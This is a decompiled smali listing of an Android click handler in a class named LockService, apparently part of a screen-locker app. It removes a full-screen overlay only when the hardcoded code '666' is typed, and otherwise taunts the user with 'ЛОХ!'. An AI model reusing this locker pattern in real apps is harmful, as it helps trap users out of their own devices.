.class Lcom/lololo/LockService$100000001;
.super Ljava/lang/Object;
.source "LockService.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/lololo/LockService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final this$0:Lcom/lololo/LockService;


# direct methods
.method constructor <init>(Lcom/lololo/LockService;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/lololo/LockService$100000001;->this$0:Lcom/lololo/LockService;

    return-void
.end method

.method static access$0(Lcom/lololo/LockService$100000001;)Lcom/lololo/LockService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000001;->this$0:Lcom/lololo/LockService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000001;->this$0:Lcom/lololo/LockService;

    iget-object v3, v3, Lcom/lololo/LockService;->editText1:Landroid/widget/EditText;

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v3

    invoke-interface {v3}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "666"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000001;->this$0:Lcom/lololo/LockService;

    iget-object v3, v3, Lcom/lololo/LockService;->windowManager:Landroid/view/WindowManager;

    move-object v4, v0

    iget-object v4, v4, Lcom/lololo/LockService$100000001;->this$0:Lcom/lololo/LockService;

    iget-object v4, v4, Lcom/lololo/LockService;->myView:Landroid/view/ViewGroup;

    invoke-interface {v3, v4}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :goto_0
    return-void

    :cond_0
    move-object v3, v0

    iget-object v3, v3, Lcom/lololo/LockService$100000001;->this$0:Lcom/lololo/LockService;

    iget-object v3, v3, Lcom/lololo/LockService;->editText1:Landroid/widget/EditText;

    const-string v4, "\u041b\u041e\u0425!"

    invoke-virtual {v3, v4}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0
.end method
